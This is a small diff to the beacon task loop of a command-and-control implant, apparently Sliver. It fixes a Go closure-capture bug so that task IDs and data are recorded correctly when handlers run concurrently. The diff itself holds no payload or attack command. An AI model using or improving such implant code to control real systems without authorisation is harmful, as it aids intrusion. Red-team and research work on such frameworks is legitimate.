@@ -301,7 +301,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
-			go handler(task.Data, func(data []byte, err error) {
+			data := task.Data
+			taskID := task.ID
+			go handler(data, func(data []byte, err error) {
 				resultsMutex.Lock()
 				defer resultsMutex.Unlock()
 				defer wg.Done()
@@ -311,10 +313,10 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				}
 				// {{end}}
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] task completed (id: %d)", task.ID)
+				log.Printf("[beacon] task completed (id: %d)", taskID)
 				// {{end}}
 				results = append(results, &sliverpb.Envelope{
-					ID:   task.ID,
+					ID:   taskID,
 					Data: data,
 				})
 			})
